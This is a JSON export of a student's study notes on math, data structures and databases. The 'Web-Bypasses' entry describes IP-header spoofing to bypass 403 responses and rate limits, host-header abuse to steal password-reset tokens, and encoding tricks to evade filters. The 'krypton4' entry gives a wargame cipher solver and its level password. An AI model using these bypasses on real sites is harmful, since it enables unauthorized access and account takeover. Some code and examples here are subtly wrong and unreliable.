[[/notes/Vectors|Vectors]] side by side, or, more accurately, vectors are smaller matrices, $n \\times 1$ to be precise. A matrix can be of size $n \\times m$, in which $n$ is the number of rows and $m$ is the number of columns."},"/notes/Trigonometric-Functions":{"title":"Trigonometric Functions","date":"2021-11-24T18:41:59+01:00","tags":["math/trigonometry"],"lastmodified":"2022-06-19T20:46:41.322597","content":"Trigonometric functions are basically functions that describe the relationship between the ratio of a right triangle's sides and its angles. A unit circle is very useful to describe the main trigonometric functions, while others can easily be derived from them.\n\n![[images/20211225114913.png]]","aliases":null,"description":null},"/notes/3D-Riemann-Sum-on-Rectangles":{"title":"3D Riemann Sum on Rectangles","date":"2022-03-06T07:54:48+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"When you want to calculate the area taken up by a [[/notes/Multivariable Functions|multivariable function]] in a rectangle defined by the set of points $[a,b] \\times [c,d]$ which can also be written as the rectangle drawn between the points $(a,c)$ and $(b,d)$, we can split up the rectangle into smaller rectangles of area $A$. After taking a sample point from each of those rectangles, we can add up the values of those sample points  to calculate an estimate of the space used. Obviously, as $A$ decreases, the estimate gets more accurate.\n\nThe Riemann sum of such a rectangle is therefore defined by:\n\n$$\n\\sum_{i=0}^m\\sum_{j=0}^n f(x_{ij}^*, y_{ij}^*) \\Delta x \\Delta y\n$$\n\n![[images/Pasted image 20220306200047.png]]"},"/notes/Multivariable-Functions":{"title":"Multivariable Functions","date":"2022-01-19T01:32:04+01:00","description":null,"tags":["math/multivar","math/calculus"],"aliases":["multivariable function"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Multivariable functions are functions defined in the domain $\\mathbb{R}^2$ and written as $f(x,y) = z$. These functions' graphs are three dimensional and hard to plot, so they are often projected to the 2D plane using [[/notes/Level Lines|contours]]."},"/notes/Discrete-Dynamical-Systems":{"title":"Discrete Dynamical Systems","date":"2022-03-21T09:41:18+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"If you are dealing with a system whose state can be described by a list of numbers, you can describe the state using a [[/notes/Vectors|vector]], and the different states of the system can be shown using a [[/notes/Linear Transformations|linear transformation]]. These types of systems are called **discrete dynamical systems** and each state is calculated using the formula:\n\n$$\nx_{n+1} = Ax_{n} = A^nx_0\n$$\n\nWhere $A$ is the state matrix and $x_0$ is the initial state of the system. When [[Solving Discrete Dynamical Systems|solving discrete dynamical systems]], [[/notes/Diagonalization|Diagonalization]] proves to be a very useful technique."},"/notes/Recurrence-Equations":{"title":"Recurrence Equations","date":"2021-12-21T08:19:31+03:00","description":null,"tags":["math/recursion"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A recursive function is a function that uses itself in its definition. An example of such a function is:\n\n$$\nf(x) : \\mathbb{Z^+} + \\{0\\} \\implies \\mathbb{Q}\n$$\n$$\nf(x) = \\begin{cases}\nx = 0, & 1\\\\\nx > 0, & \\frac{f(x-1)}{2}\n\\end{cases}\n$$\n\nThis function constantly makes a recursive call to itself until the value x becomes less than 0, then it hits the **base case** and returns 2. Creating a [[/notes/Closed Form Equation|Closed Form Equation]] from recurrence equations is a trivial task, Basically, you need to write out the function for several steps. For instance:\n- [ ] Closed form equation link\n\n$$\nf(x) = \\frac{f(x-1)}{2}\n= \\frac{f(x-2)}{4}\n= \\frac{f(x-3)}{8}\n= \\frac{f(x-n)}{2^n}\n$$\n\nSince this recursion will continue until x is less than or equal to 0, we can write this function as:\n\n$$\nf(x) = \\frac{1}{2^x}\n$$"},"/notes/Deletion-Anomalies":{"title":"Deletion Anomalies","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"When you have a redundant database and you delete all tuples that contain a certain value for a certain attribute. All data on that attribute is lost, making it impossible to create new tuples with that attribute.\n\nFor instance, in the table:\n\n| student_id | student_name | class |\n|------------|--------------|-------|\n| 1 | yigit | Java|\n| 2 | ipek| Web and Database|\n\nWhen you delete the student yigit, all information on the class Java is lost. In order to prevent such cases, it is a good idea to apply [[/notes/Relational Database Normalization|Normalizing a Relational Model]] to your database.","aliases":null,"description":null},"/notes/Dynamic-Arrays":{"title":"Dynamic Arrays","date":"2021-11-23T09:00:33+01:00","tags":["cs/analysis","cs/math","cs/lists"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Normally, adding an element to an already full [[/notes/Array|Array]] would take $O(n)$ time, if you resize it by 1 cell everytime an element is added, that is. However, when you extend the array by the number of elements there are in the array everytime it is full, the time complerxity drops to $O(1)$.\n\nThe time complexities of element additions for size of dynamic array:\n\n| 1   | 2   | 3   | 4   | 5   | 6   | 7   | 8   | 9   | 10  | 11  | 12  | 13  | 14  | 15  | 16  | 17  |\n| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| 1   | 2   | 1   | 4   | 1   | 1   | 1   | 8   | 1   | 1   | 1   | 1   | 1   | 1   | 1   | 16  | 1   |\n\nIn total, summing up the lower row of the table gives us $2n$ operations for an array of size $n+1$. In order to calculate the amortized time complexity of this data structure we just take the average:\n\n$$\\frac{2n}{n+1} \\cong 1$$","aliases":null,"description":null},"/notes/Third-Normal-Form":{"title":"3rd Normal Form (3NF)","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"Any 3NF schema must also be in [[/notes/Second Normal Form|2nd Normal Form (2NF)]]. The only extra requirement is that there is no [[/notes/Transitive Dependency|Transitive Dependency]] between the [[/notes/Primary Key|Primary Key]] of the relation and another attribute.\n\nIn order to convert a [[/notes/Relational Model|Relational Model]] in 2NF to 3NF, we apply [[/notes/Projection|Projection $\\pi$]] on the functional dependency that is causing the dependency.","tags":null,"aliases":null,"description":null},"/notes/Critical-Points-Multivariable-Functions":{"title":"Critical Points Multivariable Functions","date":"2022-01-19T04:51:57+01:00","description":null,"tags":["math/multivar","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A crtitical point in [[/notes/Multivariable Functions|Multivariable Functions]] are stationary points in the graph. *i.e.* $f_x(a,b) = f_y(a,b) = 0$. Or if the derivative of a function does not exist at that point.\n\nA critical point can either be a [[/notes/MinMax Points in Multivariable Functions|Minima/Maxima]] or a saddle point."},"/notes/Coordinate-Vectors":{"title":"Coordinate Vectors","date":"2022-02-27T11:58:15+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"When you have a [[/notes/Subspace|Subspace]] $W$ which is the span of some [[/notes/Basis Vectors|Basis Vectors]] $\\mathcal{B}$. You can calculate the coordinates of a vector $\\mathbf{x}$ relative to the subspace $W$, which is represented by $[\\mathbf{x}]_\\mathcal{B}$ by solving the linear system $A[\\mathbf{x}]_\\mathcal{B} = \\mathbf{x}$. You can also calculate the original vector of a coordinate relative to a subspace by doing vector matrice multiplication $A[\\mathbf{x}]_\\mathcal{B} = \\mathbf{x}$."},"/notes/Relational-Model":{"title":"Relational Model","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"A relational model, also known as a relational schema, is defined by the relations between the attributes between different entities, all of which are defined in the [[/notes/ER Diagrams|ER Diagrams]]. A relation schema, as you can guess by the name are defined using *relations* described with the form $R(A_1,...,A_n)$in which $R$ is a relation and $A_n$ are attributes.  Since relational schemas are basically a collection of different relations, they are represented as $S(R_1, R_2, R_3 ..., R_n)$ where $R_n$ are relations. The actual instance of a database is represented by tuples made from the attributes' domains. A relational model also has [[/notes/Integrity Constraints|Integrity Constraits]] represented by $C$ which must be satisfied by all instances of *S*.","tags":null,"aliases":null,"description":null},"/notes/Column-Space":{"title":"Column Space","date":"2022-02-27T10:47:02+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The column space of a matrix, $Col\tA$ is the [[/notes/Subspace|Subspace]] that is spanned by the columns of an $m \\times n$ matrix $A$.  The column space is the subspace of $\\mathbb{R}^n$"},"/notes/Difference-of-Entity-and-Entity-Type":{"title":"Entity Type vs Entity","date":"2021-11-23T14:10:26+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"An [[/notes/Entity|Entity]] type represents multiple entities, while an entity is an object in the real world that fits in the entity type. This can be compared to the relation between sets and elements of sets.","aliases":null,"description":null},"/notes/Linear-Transformations-and-Unit-Vectors":{"title":"Linear Transformations and Unit Vectors","date":"2022-02-26T02:52:34+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When doing [[/notes/Linear Transformations|Linear Transformations]], the columns of the matrix $A$ actually represent the unit vectors of the new coordinate systems."},"/notes/Copying-Lists":{"title":"Copying Lists","date":"2021-11-16T21:07:41+01:00","tags":["cs/java","cs/doc","cs/lists"],"lastmodified":"2022-06-19T20:46:41.318597","content":"When copying lists, you need to create a new [[/notes/Array|Array]]/[[/notes/Linked List|Linked List]] and copy over each element from the original list into the new one. This approach works, however, when you are copying objects, since objects are reference based, you need to call `.clone()` method of each instance.","aliases":null,"description":null},"/notes/Storing-Graphs":{"title":"Storing Graphs","date":"2022-01-23T02:57:15+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"There are three main ways of storing [[/notes/Graphs|Graphs]] in your program:\n\n- [[/notes/Edge List|Edge List]]\n- [[/notes/Adjacency Map|Adjacency Map]]\n- [[/notes/Adjacency Matrix|Adjacency Matrix]]"},"/notes/Binary-Tree-Traversal":{"title":"Binary Tree Traversal","date":"2022-01-02T09:44:41+03:00","description":null,"tags":["cs/data-structures","cs/trees","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"## With recursion\nWith recursion, it pretty straightforward, here is an example java code:\n```java\npublic static void traverse(BinaryTree t, List<Integer> l){\n\tif(t == null)\n\t\treturn;\n\ttraverse(t.getLeft(), l);\n\tl.add(t.getKey());\n\ttraverse(t.getRight(), l)\n}\n```\n\n## Without recursion\n```java\npublic static void traverse(BinaryTree t, List<Integer> l){\n\tStack<BinaryTree> s = new Stack<>();\n\tBinaryTree cur = t;\n\twhile(cur != null || !t.isEmpty()){\n\t\tif(cur == null){\n\t\t\tcur = s.pop();\n\t\t\tl.add(cur.getKey());\n\t\t\tcur = s.getRight();\n\t\t}else{\n\t\t\ts.push(cur);\n\t\t\tcur = cur.getLeft();\n\t\t}\n\t}\n}\n```"},"/notes/Down-Heap-Bubbling":{"title":"Down-Heap Bubbling","date":"2021-12-14T20:32:21+01:00","tags":["cs/algorithms","cs/data-structures"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Down-Heap bubbling is basically the reverse of [[/notes/Up-Heap Bubbling|Heap Bubbling]],  when the **heap-order property** of a heap is broken due to a node that is not a leaf, you need to apply down-heap bubbling. It has two steps:\n1. Compare the node with both its children, if it is greater than either of its children(for a min heap),switch it with the smallest of its children.\n2. Repeat step 1 until the property is restored.","aliases":null,"description":null},"/notes/Linked-List":{"title":"Linked List","date":"2021-11-16T21:07:41+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"Unlike [[/notes/Array|Array]], linked lists are data structures made up of nodes containing elements and edges connecting those nodes. In a linked list, each node must contain at least two basic fields: the element that the node contains, and a pointer to the next node in the list. However, a node can have more than those basic fields if they are used in a specialized kind of linked list. Linked lists allow adding and removing elements to the start and end of the list at $O(1)$ time, removing them can also be done in $O(1)$ time (removing the tail takes $O(n)$ since we need to start from the head to get the node that references to *tail*. This is not the case in [[/notes/Doubly Linked List|Doubly Linked List]]). However, unless we are accessing the *head* or *tail*, accessing, or adding an element in a linked list takes $O(n)$ time. Here is a basic drawing demonstrating linked lists:\n\n```mermaid\ngraph LR\n\tA[head - 1]-->B[2];\n\tB-->C[3];\n\tC-->D[2 - tail];\n```\n\n> The type of basic linked list discussed above is commonly called **Singly Linked List**.","tags":null,"aliases":null,"description":null},"/notes/Primary-Key":{"title":"Primary Key","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"Primary keys are basically a certain [[/notes/Candidate Key|Candidate Key]] which was chosen by the designer to identify a relation in a [[/notes/Relational Model|Relational Model]]. They often have semantic meaning(the make sense from the perspective of the database's user). All the other super keys which weren't chosen as the primary key are called *alternate keys*.","tags":null,"aliases":null,"description":null},"/notes/Entity":{"title":"Entity","date":"2021-12-21T04:21:47+01:00","description":null,"tags":["cs/databases"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Entities are elements in a database that represent a certain object in real world, using some of its attributes. They are implemented using tuples in a database."},"/notes/Balanced-Binary-Search-Trees":{"title":"Balanced Binary Search Trees","date":"2022-01-01T03:12:26+01:00","description":null,"tags":["cs/data-structures","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"How a [[/notes/Binary Search Trees|BST]] performs depends largely on how well balanced it is. If a tree has mostly linear structure, then its worst-case time complexity for searching becomes $O(n)$ instead of $O(log(n))$. In order to balance a tree, [[/notes/Binary Tree Rotations|rotations]] are crucial."},"/notes/Insertion-Sort-on-a-Partially-Sorted-List":{"title":"Insertion Sort on a Partially Sorted List","date":"2021-12-21T02:14:06+01:00","description":null,"tags":["cs/algorithms","cs/sorting"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When you have a partially sorted list, you can change the definition of the [[/notes/Priority Queue|Priority Queue]] you use in [[/notes/Insertion Sort|Insertion Sort]] so that the new elements are first added to the end of the queue. This way, the algorithm's time complexity changes to $O(n+I)$ where $I$ is the number of inversions[^1] in a list.\n\n[^1]: A pair of elements in the list that start out in the wong relative order."},"/notes/Web-Bypasses":{"title":"Bypasses","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/web"],"lastmodified":"2022-06-19T20:46:41.322597","content":"By setting this to `127.0.0.1`, forbidden 403 responses. Also, you can occasionally bypass rate limitations by changing the value of the header to another ip every-time you get rate-limited.\n\n## Host Headers\n\n`X-Forwarded-For` this header is sometimes used in applications that utilize a middleware. Using this header, we can alter the URLs sent to a user\\'s email, which could allow us to steal password changing tokens.\n\n## Encoding\n\n### Double URL Encoding\n\nThis technique is fairly simple, you first encode the parameters you are sending and then re-encode the encoding string so that the `%` signs are encoded into `%25` as well.\n\n### Overlong Unicode Encoding\n\nThe way unicode works is that each character might have a different length, and the character\\'s length is defined by the value of the most significant bits of the most significant byte. If that byte is 0, than the character is a single byte, if `110` than the character is 2 bytes, if `1110` then the character is 3 bytes and so on. In multi-byte characters, the first two bits of each byte that is not the most significant byte are set to `10` to indicate that they are continuation bytes of the previous byte. These continuation bytes and the length specifying byte are removed when the character is being processed. This can be used to represent the same character in different formats, some of which might not be recognised by the protections in place:\n\n    A (1 byte)  : 01000001 : %41\n    A (2 bytes) : (110)00001 (10)000001 -> 0000 1000001: %c1%81\n    A (3 bytes) : (1110)0000 (10)000001 (10)000001  -> 000000000 1000001: %c1%81%81\n\n### 16-Bit Unicode Encoding\n\nJust encode the parameters as 16-bit unicode. It is that simple.","aliases":null,"description":null},"/notes/Determinant":{"title":"Determinant","date":"2022-03-06T10:32:54+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The determinant of a [[/notes/Matrixes|matrix]] is how much that [[/notes/Linear Transformations|linear transformation]] changes the space that a **unit square** takes. Since a unit square can be infinitely small, a determinant therefore gives us by what factor $c$ any given matrix multiplies any shape's area.\n\n## Zero Determinants\nIf the determinant is zero, it means that the shape is squeezed into a smaller [[/notes/Dimension|Dimension]] by the matrice.\n\n## Negative Determinants\nA negative determinant means that the shape is **flipped over**."},"/notes/Basis-of-a-column-space":{"title":"Basis of a column space","date":"2022-02-27T11:02:39+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The [[/notes/Basis Vectors|Basis Vectors]] of a [[/notes/Column Space|Column Space]] are determined using the following method:\n\n1. The [[/notes/Matrixes|matrix]] is row reduced so that it is in [[/notes/Echeleon Forms|echeleon form]]\n2. The columns in the **original matrix** that have a pivot point in the reduced matrix act as the basis vectors of the column space"},"/notes/Eigenvalues":{"title":"Eigenvalues","date":"2022-03-20T06:11:04+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The eigenvalue of an [[/notes/Eigenvectors|eigenvector]] $w$ is basically how much the [[/notes/Linear Transformations|linear transformation]] scales the [[/notes/Vectors|vector]]. An eigenvector can only have one eigenvalue, however, there are infinitely many eigenvectors for a given eigenvalue, since all the multiples of the eigenvector $w$ has an eigenvalue of $\\lambda$ as well."},"/notes/Solutions-of-Linear-Systems":{"title":"Solutions of Linear Systems","date":"2022-02-11T09:50:08+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A linear system can have three possible states:\n\n![[images/180F9890-1E39-41E1-A9D1-420FAB46682F.jpeg|300]]\n\nIn order to solve a linear system, the system is converted to [[/notes/Reduced Echeleon Forms|reduced echeleon form]], and then to [[/notes/Parametric Vector Form|parametric form]]."},"/notes/krypton4":{"title":"krypton4","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/cryptography"],"lastmodified":"2022-06-19T20:46:41.322597","content":"This time a [[/notes/Vigenere|vigenere cipher]] is used to encrypt the text. We know the key is 6 characters long. There are two files. We can just use a simple vigenere [solver](https:f00l.de/hacking/vigenere.php>). Or we can use the script I wrote:\n\n```python\ndef letter_freq(string):\n    counts = [0]*26\n    freqs = {}\n    for i in string:\n        c = ord(i.upper()) - 65\n        if -1 < c < 26:\n            counts[c] += 1\n    for i in range(26):\n        freqs[chr(i+65)] = counts[i]/len(string)\n    return freqs\n\ndef shiftback(s,c):\n    f = \"\"\n    for i in s:\n        foo = ord(i) - ord(c)\n        if foo < 0:\n            f += chr(foo + 26 + 65)\n        else:\n            f += chr(foo + 65)\n    return f\n\ndef calcoffset(s):\n    freqs={'E': 0.12,'T': 0.091,'A': 0.0812,'O': 0.0768,'I': 0.0731,'N': 0.0695,'S': 0.0628,'R': 0.0602,'H': 0.0592,'D': 0.0432,'L': 0.0398,'U': 0.0288,'C': 0.0271,'M': 0.0261,'F': 0.023,'Y': 0.0211,'W': 0.0209,'G': 0.0203,'P': 0.0182,'B': 0.0149,'V': 0.0111,'K': 0.0069,'X': 0.0017,'Q': 0.0011,'J': 0.001,'Z': 0.0007}\n    probs = {}\n    for i in range(26):\n        p = 0\n        foo = shiftback(s,chr(i+65))\n        f = letter_freq(foo)\n        for j in f:\n            p += abs(f[j] - freqs[j])/2\n        probs[chr(65+i)] = p\n    best = (0,1)\n    for i in probs:\n        if probs[i] < best[1]:\n            best = (i,probs[i])\n    return best\n\ndef slice(s,l):\n    slices = []\n    for i in range(l):\n        substr = \"\"\n        for c in range(i, len(s), l):\n            substr += s[c]\n        slices.append(substr)\n    return slices\n\ndef findkey(s,keylen):\n    key = \"\"\n    chances = 1\n    slices = slice(s,keylen)\n    for i in slices:\n        (c,prob) = calcoffset(i)\n        chances -= prob/keylen\n        key += c\n    return key,chances\n\ndef decrypt(s,key):\n    d = \"\"\n    for i in range(len(s)):\n        d+=shiftback(s[i],key[i%len(key)])\n    return d\n\ndef solve(s,cipher,mkl=20,keylen=None):\n    s = s.replace(\" \",\"\").upper()\n    cipher = cipher.replace(\" \",\"\").upper()\n    if keylen:\n        best = findkey(cipher,keylen)\n        return [(decrypt(s,best[0]),best[0],best[1])]\n    else:\n        keys = []\n        for i in range(1,mkl+1):\n            res = findkey(cipher,i)\n            keys.append((decrypt(s,res[0]),res[0],res[1]))\n        return sorted(keys, key=lambda tup: tup[2],reverse=True)\n\nciphertext = \"<<concatanated>>\" # Too long, enter the contents of found1 or found2\nsolution = solve('HCIKV RJOX', ciphertext, keylen=6)[0]\nprint(\"Key Found: \" + solution[1])\nprint(\"Decrypted Text Is: \" + solution[0])\nprint(\"Confidence: {0:.0f}%\".format(solution[2]*100))\n```\n\nPassword is *CLEARTEXT*","aliases":null,"description":null},"/notes/Reduced-Echeleon-Forms":{"title":"Reduced Echeleon Forms","date":"2022-02-22T04:13:13+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Reduced echeleon forms are a specialized form of [[/notes/Echeleon Forms|Echeleon Forms]] which is:\n\n$$\n\\begin{bmatrix}\n0 & 1 & 0 & * & 0 \\\\\n0 & 0 & 1 & * & 0 \\\\\n0 & 0 & 0 & 0 & 1 \\\\\n0 & 0 & 0 & 0 & 0\n\\end{bmatrix}\n$$\n\nThe main difference between reduced and regular echeleon forms is that $P$s are $1$ and the column that the pivots are in, all the other rows must have the value $0$."},"/notes/Tree-Traversal":{"title":"Tree Traversal","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"[[/notes/Tree|Tree]] Traversal is the process of visiting/processing every node in a tree using a consistent method. Every traversal algorithm, has a time complexity in [[/notes/Big-Oh Notation|Big-Oh Notation]] $O(n)$ where n is the number of nodes in the tree. There are two types of three traversal methods:\n\n* **Depth First:** In this method, we go down each subtree of a node before visiting other nodes, so the nodes at lower heights aren't necessarily prioritized. There are two algorithms for this:\n\t* [[/notes/Pre-Order Traversal|Pre-Order Tree Traversal]]\n\t* [[/notes/Post-Order Traversal|Post-Order Tree Traversal]]\n* [[/notes/Breadth-First Traversal|Breadth First Traversal]].","tags":null,"aliases":null,"description":null},"/notes/Clairauts-Theorem":{"title":"Clairaut's Theorem","date":"2022-01-19T01:53:11+01:00","description":null,"tags":["math/multivar","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"When calculating the second derivative of a function $f(x,y)$, $f_xy = f_yx$. *i.e.* The order of derivation doesn't matter. This can also be represented as:\n\n$$\n\\frac{\\partial^2f}{\\partial x \\partial y} = \\frac{\\partial^2f}{\\partial y \\partial x}\n$$"},"/notes/Matrix-Multiplication-Row-Column-Rule":{"title":"Matrix Multiplication Row-Column Rule","date":"2022-02-26T04:10:53+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When you [[/notes/Matrix Multiplication|multiply]] two matrices, $A$ and $B$, and only want one entry($ij$) in the result matrice $C$, we can use the formula:\n\n$$\nC_{ij} = A_{i1}B_{1j} + A_{i2}B_{2j} + A_{i3}B_{3j} + ... + A_{in}B_{nj}\n$$"},"/notes/Important-Properties-of-a-Graph":{"title":"Important Properties of a Graph","date":"2022-01-23T09:42:20+01:00","description":null,"tags":["cs/data-structures"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Let $G$ be a [[/notes/Graphs|graph]] with $m$ edges in its edge set $E$ and $n$ vertices in its vertex set $V$:\n\n$$\n\\sum_{v in V}deg(v) = 2m\n$$\n\nIf G is directed:\n\n$$\n\\sum_{v in V}outdeg(v) = \\sum_{v in V}indeg(v) = m\n$$\n\n* If G is [[/notes/Graph Terminology#^42fbff|connected]],  $m \\geq n-1$\n* If G is [[/notes/Graph Terminology#^78100b|a tree]],  $m = n-1$\n* If G is [[/notes/Graph Terminology#^d6fb26|a forest]],  $m \\leq n-1$\n\nIf G is a simple graph with $n$ vertices, the number of edges is $O(n^2)$."},"/notes/Linear-Combinations":{"title":"Linear Combinations","date":"2022-02-22T06:13:07+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Given the [[/notes/Vectors|Vectors]] $v_1,v_2,...v_n$ in $\\mathbb{R}^n$, and scalars $c_1,c_2,...,c_n$, the linear combination of these vectors, $y$, is:\n\n$$\ny = c_1v_1 + c_2v_2 + c_3v_3 + ... + c_nv_n\n$$\n\nwhere the scalars are called the **weights**."},"/notes/Complex-Numbers":{"title":"Complex Numbers","date":"2022-03-06T09:01:17+01:00","description":null,"tags":["math/calculus","math/algebra"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"These numbers are complex, they are hard to understand, just like your ex. Except they don't sleep with your best friend and give you chlamidia.\n\nA complex number is a number that can be written in the form $a + bi$ where $a$ is the real part and $b$ is the imaginary part.  $i$ is called an imaginary number because it is defined so that $i^2=-1$. When you plot the real part of complex numbers in the $x$ axis and the imaginary part in the $y$ axis, you get a pretty nice way to represent numbers as well as rotations.\n\n\t\t\n<iframe height=\"500px\" width=\"100%\" src=\"https://prime-applets.ewi.tudelft.nl/apps/calculus/complex/\"></iframe>"},"/notes/Dimension":{"title":"Dimension","date":"2022-02-27T12:07:35+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The dimension of a [[/notes/Subspace|Subspace]] $dim W$ is the number of vectors in the [[/notes/Basis Vectors|basis]]."},"/notes/Normal-Forms":{"title":"Normal Forms","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"When designing a schema, one of the important steps is to choose a normal form that the schema will conform to. There are 7 normal forms. From *6NF* to *1NF* and *BCNF*:\n![[images/3F9F712F-B268-454E-96BD-CC7EA2E1E7F2.jpeg]]\n> The inner you go in the circle, less anomalies and redundancies occur and the better the design quality gets.","tags":null,"aliases":null,"description":null},"/notes/Selection-Sort":{"title":"Selection Sort","date":"2021-12-21T01:45:34+01:00","description":"A sorting algorithm based on priority queues","tags":["cs/sorting","cs/algorithms"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Selection sort is a sorting algorithm based on [[/notes/Priority Queue|Priority Queue]]s. In order to sort using selection sort, the items are inserted into a priority queue with their values as keys in the order they are currently at (i.e. not altering the order, meaning each insertion takes $O(1)$ time and $O(n)$ time in total). Afterwards, items are removed from the priority queue, since the order hasn't changed, this operation takes $O(n^2)$."},"/notes/Series":{"title":"Series","date":"2022-01-17T05:10:59+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Series are closely related to [[/notes/Sequences|Sequences]]. Basically a series is the sum of the first $k$ elements in a given series.  A serie is written as:\n$$\nS_k = \\sum^k_{n=1}a_n\n$$\nIn series, k is often taken to $\\infty$, so a more common notation is:\n$$\nS = \\sum^\\infty_{n=1}a_n\n$$"},"/notes/ER-Diagram-Total-Participation":{"title":"Total Participation in ER Diagrams","date":"2021-11-23T14:10:26+01:00","tags":["cs/databases","cs/diagrams"],"lastmodified":"2022-06-19T20:46:41.318597","content":"When drawing [[/notes/ER Diagrams|ER Diagrams]], you need to draw relationships between [[/notes/Entity|Entity]]s, for which you use lines. However, there are cases where a single line is not enough, cases where you need to **enforce** that line. Which means that every single entity must have that relationship. This is called **total participation**. \n\n![[images/20211123105758.png]]","aliases":null,"description":null},"/notes/Augmented-Matrix":{"title":"Augmented Matrix","date":"2022-02-11T09:52:53+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"![[images/A7E0F393-DBB5-46CE-B6F8-8458BA9FD6E1.jpeg]]"},"/notes/In-Place-Merge-Sort":{"title":"In-Place Merge-Sort","date":"2021-12-30T11:41:59+03:00","description":null,"tags":["cs/sorting","cs/java"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"It is sometimes more efficient to implement [[/notes/Merge Sort|Merge Sort]] in-place. Here is an implementation that sorts an two-dimensional array of strings according to a column, the explanations are made as comments:\n\n```java\npublic static void merge(String[][] in, String[][] out, int start, int inc, int col){\n\tint end1 = Math.min(inc + start, in.length);\n\tint end2 = Math.min(start + inc * 2, in.length);\n\n\tint x = start;\n\tint y = start + inc;\n\tint z = start;\n\n\twhile(x < end1 && y < end2){\n\t\tif(in[x][col].compareTo(in[y][col]) <= 0) /* the <= here is crucial since it allows for stable sorting */\n\t\t\tout[z++] = in[x++];\n\t\telse\n\t\t\tout[z++] = in[y++];\n\t}\n\n\tif(x < end1) /* If right side of the array is consumed first, fill the rest up with the left side */\n\t\tfor(int i = 0; i < end1 - x; i++)\n\t\t\tout[z+i] = in[x+i];\n\telse if(y < end2) /* Do the opposite otherwise */\n\t\tfor(int i = 0; i < end2 - y; i++)\n\t\t\tout[z+i] = in[y+i];\n}\n\npublic static void stableSort(String[][] intable, int column) {\n\tint s = 1;\n\tString[][] table = intable;\n\n\tif(table == null || table.length <= 1 || 0 > column || column >= table[0].length)\n\t\treturn;\n\n\tString[][] table2 = new String[table.length][table[0].length];\n\tfor(int i = 0; i < table.length; i++)\n\t\tfor(int j = 0; j < table[i].length; j++)\n\t\t\ttable2[i][j] = table[i][j];\n\n\tString[][] temp;\n\tint n = table.length;\n\n\tfor(int i = 1; i < n; i*=2){\n\t\tfor(int j = 0; j < n; j += 2*i)\n\t\t\tmerge(table, table2, j, i, column);\n\t\ttemp = table; table = table2; table2 = temp;\n\t}\n\n\tif(intable != table)\n\t\tfor(int i = 0; i < table.length; i++)\n\t\t\tintable[i] = table[i];\n\t}\n}\n```"},"/notes/Inserting-and-Removing-Elements-From-Heap":{"title":"Inserting and Removing and Elements to/from Heap","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"### Adding Elements\nWhen adding an element, add the element to the end of the heap, and apply [[/notes/Up-Heap Bubbling|Heap Bubbling]] to that element.\n\n### Removing an Element\nWhen removing an element, you fill the empty spot in the heap with the last element in the heap and apply [[/notes/Down Heap Bubbling|Down-Heap Bubbling]] on that element.","tags":null,"aliases":null,"description":null},"/notes/Binary-Tree-Restructuring":{"title":"Binary Tree 